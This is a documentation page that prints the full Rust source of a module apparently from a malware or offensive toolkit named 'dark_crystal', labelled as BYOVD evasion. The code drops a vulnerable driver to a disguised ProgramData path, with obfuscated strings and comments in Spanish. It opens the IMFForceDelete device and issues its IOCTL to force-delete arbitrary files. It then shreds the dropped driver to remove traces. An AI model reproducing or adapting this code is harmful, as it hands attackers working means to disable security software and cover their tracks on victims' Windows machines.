# driver

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crates/core/src/experimental/evasion/byovd/driver.rs` |
| **Lines** | 132 |
| **Cards** | T018-byovd |
| **Role** | Vulnerable driver loading |
| **Unsafe blocks** | 5 |

## Public API

### `drop_driver` (line 13)
```rust
pub fn drop_driver(driver_bytes: &[u8]) -> Result<PathBuf>
```

### `open_device` (line 36)
```rust
pub fn open_device() -> Result<HANDLE>
```

### `close_device` (line 62)
```rust
pub fn close_device(h_driver: HANDLE) -> Result<()>
```

### `force_delete` (line 69)
```rust
pub fn force_delete(h_driver: HANDLE, target_path: &str) -> Result<()>
```

### `shred_driver_file` (line 105)
```rust
pub fn shred_driver_file(path: &Path) -> Result<()>
```

## Key Dependencies

- `use anyhow::{bail, Context, Result};`
- `use winapi::um::errhandlingapi::GetLastError;`
- `use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};`
- `use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};`
- `use winapi::um::ioapiset::DeviceIoControl;`
- `use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, HANDLE};`

## Full Source

```rust
use anyhow::{bail, Context, Result};
use std::ffi::OsStr;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::ptr;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::winnt::{GENERIC_READ, GENERIC_WRITE, HANDLE};

pub fn drop_driver(driver_bytes: &[u8]) -> Result<PathBuf> {
    // Usar una ruta que parezca legítima
    let sys_path = PathBuf::from(
        std::env::var("ProgramData").unwrap_or_else(|_| crate::obf!("C:\\ProgramData").to_string()),
    )
    .join(crate::obf!("Microsoft"))
    .join(crate::obf!("Windows"))
    .join(crate::obf!("DeviceMetadataStore"))
    .join(crate::obf!("audrv.sys")); // Extensión .sys pero nombre benigno

    if !sys_path.exists() {
        if let Some(parent) = sys_path.parent() {
            std::fs::create_dir_all(parent).ok();
        }
        let mut file =
            std::fs::File::create(&sys_path).context("No se pudo crear archivo del driver")?;
        file.write_all(driver_bytes)
            .context("No se pudo escribir driver")?;
    }

    Ok(sys_path)
}

pub fn open_device() -> Result<HANDLE> {
    let device_name: Vec<u16> = OsStr::new(&crate::obf!(r"\\.\IMFForceDelete123"))
        .encode_wide()
        .chain(Some(0))
        .collect();

    let handle = unsafe {
        CreateFileW(
            device_name.as_ptr(),
            GENERIC_READ | GENERIC_WRITE,
            0,
            ptr::null_mut(),
            OPEN_EXISTING,
            0,
            ptr::null_mut(),
        )
    };

    if handle == INVALID_HANDLE_VALUE {
        let err = unsafe { GetLastError() };
        bail!("No se pudo abrir device del driver. Error: 0x{:X}", err);
    }

    Ok(handle)
}

pub fn close_device(h_driver: HANDLE) -> Result<()> {
    unsafe {
        CloseHandle(h_driver);
    }
    Ok(())
}

pub fn force_delete(h_driver: HANDLE, target_path: &str) -> Result<()> {
    let prefix = crate::obf!(r"\\??\\");
    let full_path = format!("{}{}", prefix, target_path);

    let mut wstr_file: Vec<u16> = OsStr::new(&full_path)
        .encode_wide()
        .chain(Some(0))
        .collect();

    let mut bytes_returned = 0u32;

    let result = unsafe {
        DeviceIoControl(
            h_driver,
            0x8016E000, // IOCTL de IMFForceDelete
            wstr_file.as_mut_ptr() as *mut _,
            (wstr_file.len() * std::mem::size_of::<u16>()) as u32,
            ptr::null_mut(),
            0,
            &mut bytes_returned,
            ptr::null_mut(),
        )
    };

    if result == 0 {
        let error_code = unsafe { GetLastError() };
        bail!(
            "DeviceIoControl(IMFForceDelete) fallo. Error: 0x{:X}",
            error_code
        );
        // No fallar si el archivo no existe o está protegido
    }

    Ok(())
}

pub fn shred_driver_file(path: &Path) -> Result<()> {
    if !path.exists() {
        return Ok(());
    }

    // Sobreescribir con ceros antes de borrar
    if let Ok(metadata) = std::fs::metadata(path) {
        let size = metadata.len() as usize;
        let zeros = vec![0u8; size];
        std::fs::write(path, &zeros).ok();

        // Segunda pasada con 0xFF
        let ones = vec![0xFFu8; size];
        std::fs::write(path, &ones).ok();

        // Tercera pasada con patrón
        let mut pattern = Vec::with_capacity(size);
        for i in 0..size {
            pattern.push((i % 256) as u8);
        }
        std::fs::write(path, &pattern).ok();
    }

    // Borrar el archivo
    std::fs::remove_file(path).ok();

    Ok(())
}

```